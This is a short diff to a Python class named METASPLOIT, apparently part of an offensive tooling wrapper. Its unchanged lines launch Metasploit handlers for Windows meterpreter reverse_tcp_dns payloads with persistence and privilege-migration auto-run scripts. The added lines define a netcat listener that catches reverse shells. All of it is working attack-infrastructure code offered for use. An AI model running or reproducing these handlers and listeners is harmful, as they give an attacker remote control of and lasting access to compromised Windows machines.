@@ -37,3 +37,6 @@ class METASPLOIT(object):
         os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp_dns;set LPORT %s;set LHOST %s;set autorunscript multi_console_command -rc persist.rc;set ExitOnSession false;exploit -j\'' %(portnum,DNSaddr))
     def metdns_normal(self,portnum,DNSaddr):
         os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp_dns;set LPORT %s;set LHOST %s;set ExitOnSession false;set autorunscript post/windows/manage/priv_migrate;exploit -j\'' %(portnum,DNSaddr))
+    ########NC#######
+    def nclisterner(self,portnum):
+        os.system('nc -lvp %s'%portnum)
